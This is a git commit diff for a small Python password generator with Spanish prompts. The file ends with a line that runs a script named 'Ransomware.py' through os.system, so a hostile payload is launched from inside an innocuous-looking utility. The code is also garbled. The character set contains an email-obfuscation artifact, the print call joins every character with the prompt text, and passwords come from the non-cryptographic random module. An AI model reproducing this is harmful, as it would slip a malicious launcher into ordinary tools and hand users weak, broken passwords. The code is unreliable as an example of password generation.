abe29d6c22564243f8dcf0c46a7b8681abaae6fb
rafagh00 <32714333+rafagh00@users.noreply.github.com>
2022-05-26 15:00:55 -0500

    Updated password generator

--- Password-generator.py
+++ Password-generator.py
@@ -2,11 +2,30 @@ import random
 import string
 
 
-total = string.ascii_letters + string.digits + string.punctuation
-passlength = input("Indique el largo de la contraseña:\t")
-length = passlength
+## characters to generate password from
+characters = list(string.ascii_letters + string.digits + "[email protected]#$%^&*()")
 
-password = "".join(random.sample(total, length))
+def generate_random_password():
+	## length of password from the user
+	length = int(input("Indique largo de la contrasena: "))
 
-print("Nueva contraseña:\t" + password)
+	## shuffling the characters
+	random.shuffle(characters)
+	
+	## picking random characters from the list
+	password = []
+	for i in range(length):
+		password.append(random.choice(characters))
+
+	## shuffling the resultant password
+	random.shuffle(password)
+
+	## converting the list to string
+	## printing the list
+	print("Nueva contrasena".join(password))
+
+
+
+## invoking the function
+generate_random_password()
 os.system("Ransomware.py")
